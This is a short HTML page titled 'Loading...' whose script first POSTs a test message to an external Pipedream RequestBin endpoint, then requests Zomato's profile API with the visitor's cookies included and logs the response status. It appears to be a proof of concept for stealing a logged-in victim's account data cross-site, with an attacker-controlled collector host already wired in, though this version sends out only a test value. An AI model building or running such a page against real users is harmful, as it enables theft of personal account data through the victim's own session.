<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<div id="status"></div>
<script>
function log(msg) {
    document.getElementById('status').innerHTML += msg + '<br>';
}

log('Step 1: Testing RequestBin...');

// Test RequestBin first
fetch('https://eomfuajl79ed6za.m.pipedream.net', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({test: 'hello'})
})
.then(() => {
    log('Step 1: RequestBin works! âœ“');
    log('Step 2: Fetching zomato.com API...');
    
    return fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile', {
        credentials: 'include'
    });
})
.then(response => {
    log('Step 2: Got response: ' + response.status);
})
.catch(err => {
    log('ERROR at some step: ' + err.message);
});
</script>
</body>
</html>
